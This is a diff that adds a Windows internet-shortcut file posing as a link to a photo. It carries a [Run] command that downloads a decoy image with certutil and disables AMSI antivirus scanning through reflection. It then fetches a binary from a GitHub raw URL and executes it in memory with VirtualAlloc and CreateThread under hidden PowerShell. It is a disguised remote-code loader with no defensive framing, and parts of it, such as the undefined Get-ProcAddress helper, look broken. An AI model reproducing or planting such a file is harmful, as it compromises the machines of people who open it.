@@ -1,0 +1,6 @@
+[InternetShortcut]
+URL=https://raw.githubusercontent.com/LuRemote/test_mail/main/photo.png
+IconFileName=%SystemRoot%\system32\imageres.dll
+IconIndex=-69
+[Run]
+Command=cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/LuRemote/test_mail/main/photo.png %TEMP%\photo.png & start "" %TEMP%\photo.png & set "img=$x=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$x.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);" & set "dat=$b=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/LuRemote/test_mail/main/data.bin');$m=[Runtime.InteropServices.Marshal];$p=$m::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAlloc),[Func[IntPtr,Int32,Int32,Int32,IntPtr]]).Invoke([IntPtr]::Zero,$b.Length,0x3000,0x40);$m::Copy($b,0,$p,$b.Length);$m::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll CreateThread),[Func[IntPtr,Int32,IntPtr,IntPtr,Int32,IntPtr]]).Invoke([IntPtr]::Zero,0,$p,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null" & powershell -w hidden -c "%img%%dat%"
